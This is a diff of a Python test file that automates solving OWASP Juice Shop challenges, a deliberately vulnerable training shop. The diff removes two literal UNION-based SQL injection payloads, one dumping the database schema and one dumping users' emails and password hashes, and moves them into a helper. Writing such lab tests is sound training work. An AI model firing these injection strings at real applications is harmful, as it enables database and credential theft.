@@ -22,17 +22,15 @@ def test_login_as_a_chosen_user(shop, solves):
 
 def test_dump_the_database_schema(shop, solves):
     # The search query is also built from strings. UNION adds rows from
-    # sqlite_master (the schema) to the product results; 9 columns to match.
-    payload = "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
+    # sqlite_master (the schema) to the product results.
     with solves("Database Schema"):
-        response = shop.get("/rest/products/search", params={"q": payload})
+        response = shop.union_search("sql", "sqlite_master")
     assert any("CREATE TABLE" in str(row.get("id")) for row in response.json()["data"])
 
 
 def test_dump_every_users_credentials(shop, solves):
-    payload = "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
     with solves("User Credentials"):
-        response = shop.get("/rest/products/search", params={"q": payload})
+        response = shop.union_search("id,email,password", "Users")
     rows = response.json()["data"]
     admin = next(r for r in rows if r["name"] == "admin@juice-sh.op")
     # Unsalted MD5: a second vulnerability on top of the injection.
